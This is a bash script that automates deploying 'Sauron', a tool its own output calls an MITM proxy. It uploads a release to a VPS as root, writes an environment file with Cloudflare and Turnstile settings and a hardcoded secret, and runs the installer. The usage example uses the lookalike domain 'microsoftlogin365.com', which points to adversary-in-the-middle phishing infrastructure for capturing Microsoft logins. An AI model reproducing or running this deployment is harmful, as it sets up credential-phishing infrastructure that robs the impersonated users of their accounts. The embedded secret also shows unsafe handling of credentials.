#!/bin/bash
set -e

# Sauron Auto-Deployment Script
# This script automates the entire deployment process

VPS_IP="$1"
DOMAIN="$2"
CF_TOKEN="$3"

if [ -z "$VPS_IP" ] || [ -z "$DOMAIN" ] || [ -z "$CF_TOKEN" ]; then
    echo "Usage: $0 <VPS_IP> <DOMAIN> <CLOUDFLARE_TOKEN>"
    echo ""
    echo "Example:"
    echo "  $0 192.168.1.100 microsoftlogin365.com your_cf_token_here"
    echo ""
    exit 1
fi

VERSION="v2.0.0"
RELEASE_FILE="sauron-$VERSION-linux-amd64.tar.gz"

echo "🚀 Sauron Auto-Deployment"
echo "📊 Target VPS: $VPS_IP"
echo "🌐 Domain: $DOMAIN"
echo "🔐 Cloudflare Token: ${CF_TOKEN:0:8}..."
echo ""

# ───────────── Build Release Package ─────────────
echo "🔨 Building release package..."
if [ ! -f "release-$VERSION/$RELEASE_FILE" ]; then
    ./scripts/build-release.sh "$VERSION"
fi

# ───────────── Upload to VPS ─────────────
echo "📤 Uploading to VPS..."
scp "release-$VERSION/$RELEASE_FILE" "root@$VPS_IP:/tmp/"

# ───────────── Deploy on VPS ─────────────
echo "🚀 Deploying on VPS..."
ssh "root@$VPS_IP" << EOF
    cd /tmp
    
    # Extract release
    tar -xzf "$RELEASE_FILE"
    cd sauron
    
    # Create environment file
    cat > .env << ENV_EOF
SAURON_DOMAIN=$DOMAIN
CLOUDFLARE_API_TOKEN=$CF_TOKEN
TURNSTILE_SECRET=0x4AAAAAABh4ix44s4LMgjPejfwrj6rKHwk
LICENSE_TOKEN_SECRET=\$(openssl rand -hex 32)
DEV_MODE=false
STAGING=false
ENV_EOF
    
    # Run installation
    chmod +x install-production.sh
    ./install-production.sh
    
    echo "✅ Deployment complete!"
    echo "🌐 Access admin panel: https://$DOMAIN/admin"
    echo "🔑 Admin key saved in .env file"
EOF

echo ""
echo "🎉 Sauron deployed successfully!"
echo "🌐 MITM Proxy running on: https://$DOMAIN"
echo "📡 WebSocket interface: wss://$DOMAIN/ws"
echo "🔍 Check status: ssh root@$VPS_IP 'systemctl status sauron'"
echo "📋 View logs: ssh root@$VPS_IP 'journalctl -u sauron -f'"
echo ""
